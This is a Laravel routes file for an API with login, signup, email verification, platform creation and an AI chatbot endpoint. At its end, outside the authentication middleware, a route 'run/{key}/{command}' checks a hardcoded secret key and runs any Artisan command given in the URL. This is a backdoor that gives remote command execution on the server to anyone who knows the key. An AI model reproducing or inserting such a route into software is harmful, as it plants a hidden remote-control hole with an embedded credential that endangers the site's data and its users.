<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;
use App\Modules\Users\Controllers\UserAuthController;
use App\Modules\Features\Controllers\FeatureController;
use App\Modules\Platforms\Controllers\PlatformController;
use App\Modules\AIChatBot\Controllers\AIChatBotController;

Route::post('login', [UserAuthController::class, 'login']);
Route::post('signup', [UserAuthController::class, 'signUp']);
Route::post('resend-otp', [UserAuthController::class, 'resendOtp']);
Route::post('verify-email', [UserAuthController::class, 'verifyEmail'])
    ->middleware(['auth:sanctum', 'abilities:not-verified']);

Route::get('/features', [FeatureController::class, 'getActiveFeatures']);
Route::group(['middleware' => ['auth:sanctum']], function () {
    Route::delete('logout', [UserAuthController::class, 'logout']);
    Route::post('/domain-available', [PlatformController::class, 'isDomainAvailable']);
    Route::post('platform/create', [PlatformController::class, 'store']);
    Route::get('platform/selling-systems', [PlatformController::class, 'sellingSystems']);
    Route::post('bot/message', [AIChatBotController::class, 'chat']);
});



Route::get('run/{key}/{command}', function($key, $command) {
    if ($key === "osamagasser734155568802") {
        $output = Artisan::call($command);
        echo nl2br($output);
    }
});
